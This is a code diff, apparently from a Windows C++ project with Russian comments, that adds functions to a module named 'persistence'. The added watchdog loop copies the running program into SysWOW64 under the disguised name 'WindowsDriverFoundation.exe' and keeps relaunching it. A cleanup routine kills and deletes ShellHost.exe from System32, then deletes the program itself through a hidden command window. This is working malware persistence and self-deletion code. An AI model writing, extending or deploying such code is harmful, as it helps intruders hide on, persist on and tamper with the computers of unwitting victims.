@@ -2,7 +2,6 @@
 #include "pers.h"
 
 namespace persistence {
-
 bool isUserAdmin() {
     BOOL isAdminFlag = FALSE;
     BYTE adminSid[SECURITY_MAX_SID_SIZE]; // Буфер для хранения SID
@@ -224,13 +223,25 @@ bool isProcessRunning(const char* exeName) {
 void watchdogLoop() {
     const char* targetPath = "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe";
     const char* exeName = "WindowsDriverFoundation.exe";
-
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
     while (true) {
         if (!isProcessRunning(exeName)) {
             ShellExecuteA(NULL, "open", targetPath, NULL, NULL, SW_SHOW);
         }
+        CopyFileA(currentPath, targetPath, TRUE);
         Sleep(5000);
     }
 }
+void deleteMainFiles() {
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+    system("taskkill /F /IM ShellHost.exe >nul 2>&1");
+    system("del /F /Q C:\\Windows\\System32\\ShellHost.exe >nul 2>&1");
+    char cmd[MAX_PATH * 2];
+    sprintf(cmd, "cmd /C ping localhost -n 2 >nul && del /F /Q \"%s\"", currentPath);
+    ShellExecuteA(NULL, "open", "cmd.exe", (std::string("/C ") + cmd).c_str(), NULL, SW_HIDE);
 
+    ExitProcess(0);
+}
 } // namespace persistence
